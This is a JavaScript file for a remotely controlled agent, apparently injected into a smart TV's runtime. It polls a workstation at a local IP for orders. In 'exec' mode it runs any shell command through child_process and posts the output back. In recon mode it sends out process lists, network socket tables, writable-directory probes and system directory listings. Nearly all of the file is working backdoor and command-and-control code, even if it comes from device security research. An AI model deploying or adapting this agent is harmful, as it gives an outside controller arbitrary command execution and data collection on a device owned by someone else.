/* TV Recon v5 — REMOTE-CONTROLLED AGENT.
 * Each cycle the page sends StartService with a fresh nonce in serviceFile,
 * so this file is re-fetched from the CDN and re-run in a fresh vm context.
 * Orders are fetched from the analyst workstation: GET /mode ->
 *   {action:'recon'}              chunked system map (small posts)
 *   {action:'exec', cmd:'...'}    run cmd via child_process, post output
 * The synchronous throw at the end marks this context crashed so the next
 * cycle restarts fresh. Async callbacks continue flushing after the throw
 * (proven by v4: posts arrived). ES5 only. */
'use strict';

var MAC = '192.168.86.86';
var PORT = 8080;
var fs = require('fs');
var http = require('http');

function post(tag, data) {
    try {
        var body = JSON.stringify({ tag: tag, data: data });
        if (body.length > 400000) body = JSON.stringify({ tag: tag, data: '(too big)' });
        var req = http.request({
            host: MAC, port: PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) {}
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 200); }); }

console.log('TV Recon v5 starting');
post('v5-cycle', { start: new Date().toISOString() });

function getMode(cb) {
    try {
        var req = http.request({ host: MAC, port: PORT, path: '/mode', method: 'GET' }, function (res) {
            var b = '';
            res.on('data', function (c) { b += c; });
            res.on('end', function () {
                var m = null;
                try { m = JSON.parse(b); } catch (e) {}
                cb(m);
            });
        });
        req.on('error', function () { cb(null); });
        req.end();
    } catch (e) { cb(null); }
}

getMode(function (mode) {
    mode = mode || { action: 'recon' };
    post('mode', mode);

    if (mode.action === 'exec') {
        /* ================= REMOTE EXEC ================= */
        try {
            var cp = require('child_process');
            post('exec-start', { cmd: mode.cmd });
            cp.exec(mode.cmd, { timeout: 20000, maxBuffer: 600000 }, function (err, stdout, stderr) {
                var out = String(stdout || '');
                var errS = String(stderr || '');
                var CH = 3500, i;
                for (i = 0; i < out.length; i += CH) post('exec-out', { i: i / CH, s: out.slice(i, i + CH) });
                for (i = 0; i < errS.length; i += CH) post('exec-err', { i: i / CH, s: errS.slice(i, i + CH) });
                post('exec-done', {
                    rc: err ? (err.code !== undefined ? err.code : String(err)) : 0,
                    outLen: out.length, errLen: errS.length
                });
            });
        } catch (e) {
            post('exec-fail', String(e));
        }
        return;
    }

    /* ================= RECON MODE (chunked) ================= */
    post('net-unix', read('/proc/net/unix', 5000));
    post('net-tcp', read('/proc/net/tcp', 4000));
    post('net-udp', read('/proc/net/udp', 2500));

    var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
    var procs = [];
    if (pids instanceof Array) {
        for (var k = 0; k < pids.length; k++) {
            var pid = pids[k];
            var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
            if (typeof s !== 'string') continue;
            var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
            var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
            if (uid !== '0' && uid !== '5001') continue;
            if (name && /^(kworker|migration|ksoftirqd|watchdog|rcu_|kthrotld|irq|mmc_|scsi_|zswap|loop|nfit|bioset|kblockd)/.test(name)) continue;
            var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
            procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
            if (procs.length >= 220) break;
        }
    }
    for (var c = 0; c < procs.length; c += 25) {
        post('procs', { chunk: c / 25, total: procs.length, list: procs.slice(c, c + 25) });
    }

    var wr = {};
    ['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
     '/dev/shm', '/run/user/5001', '/opt/usr/home/owner', '/home/owner/data',
     '/home/owner/content', '/home/owner/.cache'].forEach(function (d) {
        wr[d] = T(function () { var t = d + '/.__tvr'; fs.writeFileSync(t, '1'); fs.unlinkSync(t); return 'WRITE_OK'; });
    });
    post('writable', wr);

    post('sandbox', {
        uid: process.getuid(), gid: process.getgid(),
        groups: process.groups, cwd: process.cwd(), home: process.env.HOME
    });

    ['/opt/etc', '/usr/share/chromium-efl/upgrade', '/var', '/usr/lib/systemd/system',
     '/etc/systemd/system', '/run/user/5001', '/opt/usr/apps/xvvl3S1bvH'].forEach(function (d) {
        post('fs', { dir: d, listing: ls(d) });
    });

    post('v5-cycle', { recon: 'complete', procs: procs.length });
});

/* synchronous crash marker: next StartService cycle re-fetches fresh */
throw new Error('RECON_CYCLE_COMPLETE');